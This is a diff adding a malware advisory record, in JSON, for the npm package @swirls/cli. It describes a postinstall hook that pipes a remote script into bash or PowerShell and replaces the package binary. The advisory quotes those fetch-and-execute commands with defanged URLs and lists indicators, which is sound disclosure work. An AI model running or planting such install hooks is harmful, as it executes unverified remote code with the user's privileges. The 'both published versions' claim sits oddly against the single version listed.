@@ -1,0 +1,67 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13989",
+  "modified": "2026-11-08T17:59:03Z",
+  "published": "2026-11-08T17:58:01Z",
+  "summary": "Malicious code in @swirls/cli (npm)",
+  "details": "Both published versions of this package install through a postinstall hook (scripts/install.js) that executes an unpinned remote installer with the privileges of the installing user. On macOS/Linux it runs `execSync(\"curl -fsSL hxxps://swirls[.]ai/install | bash\")` with shell:true; on Windows it runs `powershell.exe -NoProfile -Command irm hxxps://swirls[.]ai/install[.]ps1 | iex` with SWIRLS_YES=1 injected into the environment. The hook is gated to global installs (npm_config_global or BUN_INSTALL_GLOBAL must be set) and exits early when CI is set, so it fires in the normal `npm install -g @swirls/cli` case. After fetching, it copies ~/.local/bin/swirls over the package's own bin/swirls entry point and chmods it 0755, so the shipped bin becomes a downloaded binary at install time. The fetched script is not versioned, pinned, hashed or otherwise integrity-checked; whatever the remote endpoint serves at install time executes with full user (root for -g) privileges and entirely bypasses npm tarball integrity verification. The bundled bin/swirls is a 35-line Node shim whose only action is to run ~/.local/bin/swirls.exe on Windows or print an error telling the user to run the same `curl -fsSL hxxps://wirls[.]ai/install | bash` command, and bin/README.txt documents that the tracked bin file is a placeholder to be replaced by the download. Endpoints: hxxps://swirls[.]ai/install (shell), hxxps://swirls[.]ai/install[.]ps1 (PowerShell).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@swirls/cli",
+        "purl": "pkg:npm/%40swirls/cli"
+      },
+      "versions": [
+        "0.1.145"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@swirls/cli/v/0.1.145"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13989"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-08T17:58:01Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "swirls[.]ai",
+          "wirls[.]ai"
+        ],
+        "sha256": [
+          "ee2eeb5e01286e81e8db7adf6881ee5e7d180e4a851ef4b6c0944e67da64feb6"
+        ],
+        "url_observed": [
+          "hxxps://swirls[.]ai/install",
+          "hxxps://swirls[.]ai/install[.]ps1",
+          "hxxps://wirls[.]ai/install"
+        ]
+      }
+    }
+  }
+}
